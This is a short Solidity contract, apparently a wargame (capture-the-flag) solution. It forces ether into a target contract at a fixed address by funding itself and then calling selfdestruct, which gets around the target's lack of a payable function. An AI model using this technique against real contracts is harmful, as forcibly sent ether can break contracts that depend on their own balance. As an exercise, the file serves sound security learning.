// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack_Force {
    // Address of the Delegation instance - the fallback lives here
    IForce target = IForce(0x7F23d050fc3d55d55343C17f23c5e35B247bDb67);

    // Simple fund fucntion to fund the attack contract
    function fund() external payable {}

    // executer function transfers all his ETH to target without calling any function in Force contract
    function executer() external {
        selfdestruct(payable(address(target)));
    }
}

// Empty interface - only used to type "target"
interface IForce {

}